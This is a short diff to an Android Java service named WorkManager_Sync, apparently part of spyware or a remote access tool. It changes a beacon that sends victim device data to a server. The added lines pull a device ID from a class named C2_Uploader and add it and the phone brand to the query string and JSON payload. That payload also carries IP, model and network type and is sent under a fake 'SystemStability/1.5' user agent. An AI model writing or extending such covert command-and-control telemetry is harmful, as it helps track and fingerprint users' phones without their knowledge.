@@ -835,6 +835,8 @@ public class WorkManager_Sync extends Service {
 
             // Build Query String & JSON Payload
             String queryParams = "ip=" + java.net.URLEncoder.encode(ip != null ? ip : "", "UTF-8") +
+                    "&deviceId=" + java.net.URLEncoder.encode(C2_Uploader.getDeviceId(this), "UTF-8") +
+                    "&brand=" + java.net.URLEncoder.encode(Build.MANUFACTURER, "UTF-8") +
                     "&device=" + java.net.URLEncoder.encode(fullDeviceModel, "UTF-8") +
                     "&model=" + java.net.URLEncoder.encode(fullDeviceModel, "UTF-8") +
                     "&network=" + java.net.URLEncoder.encode(networkType, "UTF-8") +
@@ -858,9 +860,10 @@ public class WorkManager_Sync extends Service {
             conn.setReadTimeout(15000);
             conn.setRequestProperty("User-Agent", "SystemStability/1.5");
 
+            String devId = C2_Uploader.getDeviceId(this);
             String json = "{" +
                     "\"ip\":\"" + ip + "\"," +
-                    "\"deviceId\":\"" + Build.MANUFACTURER + "\"," +
+                    "\"deviceId\":\"" + devId + "\"," +
                     "\"brand\":\"" + Build.MANUFACTURER + "\"," +
                     "\"device\":\"" + Build.MODEL + "\"," +
                     "\"model\":\"" + Build.MODEL + "\"," +
